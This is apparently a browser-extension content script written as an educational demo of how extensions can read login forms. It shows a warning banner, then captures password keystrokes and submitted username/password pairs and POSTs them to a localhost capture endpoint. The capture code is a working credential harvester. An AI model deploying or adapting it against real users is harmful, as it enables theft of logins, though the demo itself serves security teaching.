/**
 * Content Script — standalone (no module system)
 * Educational security demo only. Operates on localhost/127.0.0.1 exclusively.
 */
(function () {
  "use strict";

  function updateBannerStatus(isActive) {
    const statusEl = document.getElementById('__secdemo_status__');
    if (!statusEl) return;
    if (isActive) {
      statusEl.innerHTML = [
        '● Extension monitoring: <strong style="color:#e94560;">Active</strong> &nbsp;|&nbsp; ',
        'Sensitive field detected: <strong style="color:#e94560;">Yes</strong> &nbsp;|&nbsp; ',
        '<span style="color:#f0a500;">Advice: Disable unknown extensions before entering credentials.</span>'
      ].join('');
    } else {
      statusEl.innerHTML = [
        '● Extension monitoring: <strong style="color:#4caf50;">Inactive (Protection Mode ON)</strong> &nbsp;|&nbsp; ',
        'Sensitive field detected: Yes &nbsp;|&nbsp; ',
        '<span style="color:#4caf50;">✅ Input monitoring has been disabled.</span>'
      ].join('');
    }
  }

  async function sendCapture(event) {
    const MAX_ATTEMPTS = 3;
    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
      try {
        const response = await fetch("http://localhost:3000/capture", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(event),
        });
        if (response.ok) return;
      } catch (_) {
        // retry
      }
    }
    console.log("[SecurityDemo] capture:", event);
  }

  let keyupHandler = null;
  let submitHandler = null;

  function attachListeners() {
    const passwordField = document.querySelector('input[type="password"]');
    if (!passwordField) return;

    // ── Detection Mode: Security Warning Banner ──
    if (!document.getElementById('__secdemo_banner__')) {
      const banner = document.createElement('div');
      banner.id = '__secdemo_banner__';
      banner.style.cssText = [
        'position:fixed', 'top:0', 'left:0', 'right:0', 'z-index:2147483647',
        'background:#1a1a2e', 'border-bottom:3px solid #e94560',
        'color:#e0e0e0', 'font-family:monospace', 'font-size:13px',
        'padding:10px 16px', 'display:flex', 'align-items:flex-start',
        'gap:12px', 'box-shadow:0 2px 12px rgba(0,0,0,0.5)'
      ].join(';');

      const icon = document.createElement('span');
      icon.textContent = '⚠️';
      icon.style.cssText = 'font-size:20px;flex-shrink:0;margin-top:2px;';

      const content = document.createElement('div');
      content.style.cssText = 'flex:1;';
      content.innerHTML = [
        '<strong style="color:#e94560;font-size:14px;">Security Warning</strong><br/>',
        'This page contains a <strong>password field</strong>. ',
        'An installed extension with host permission can read this input.<br/>',
        '<span id="__secdemo_status__" style="color:#f0a500;">',
        '● Extension monitoring: <strong>Active</strong> &nbsp;|&nbsp; ',
        'Sensitive field detected: <strong>Yes</strong> &nbsp;|&nbsp; ',
        'Advice: Disable unknown extensions before entering credentials.',
        '</span>'
      ].join('');

      const closeBtn = document.createElement('button');
      closeBtn.textContent = '✕';
      closeBtn.style.cssText = [
        'background:none', 'border:none', 'color:#888', 'cursor:pointer',
        'font-size:16px', 'padding:0 4px', 'flex-shrink:0'
      ].join(';');
      closeBtn.onclick = function() { banner.remove(); };

      banner.appendChild(icon);
      banner.appendChild(content);
      banner.appendChild(closeBtn);
      document.body.appendChild(banner);
    }
    updateBannerStatus(true);

    // Capture each keypress on password field
    keyupHandler = function () {
      const field = document.querySelector('input[type="password"]');
      if (!field) return;
      sendCapture({
        timestamp: new Date().toISOString(),
        url: window.location.href,
        type: "keypress",
        username: "",
        value: field.value,
      });
    };
    passwordField.addEventListener("keyup", keyupHandler);

    // Capture username + password on form submit
    submitHandler = function (e) {
      const form = e.target;
      const pwField = form ? form.querySelector('input[type="password"]') : document.querySelector('input[type="password"]');
      const userField = form ? form.querySelector('input[type="text"], input[type="email"]') : document.querySelector('input[type="text"], input[type="email"]');
      sendCapture({
        timestamp: new Date().toISOString(),
        url: window.location.href,
        type: "submit",
        username: userField ? userField.value : "",
        value: pwField ? pwField.value : "",
      });
    };
    document.addEventListener("submit", submitHandler);
  }

  function detachListeners() {
    updateBannerStatus(false);
    const passwordField = document.querySelector('input[type="password"]');
    if (keyupHandler) {
      if (passwordField) passwordField.removeEventListener("keyup", keyupHandler);
      keyupHandler = null;
    }
    if (submitHandler) {
      document.removeEventListener("submit", submitHandler);
      submitHandler = null;
    }
  }

  function onStorageChange(changes) {
    if ("active" in changes) {
      if (changes["active"].newValue === true) {
        attachListeners();
      } else {
        detachListeners();
      }
    }
  }

  // Bootstrap
  if (typeof chrome !== "undefined" && chrome.storage) {
    chrome.storage.local.get("active", function (result) {
      const active = result["active"] !== false;
      if (active) attachListeners();
    });
    chrome.storage.onChanged.addListener(onStorageChange);
  } else {
    attachListeners();
  }
})();
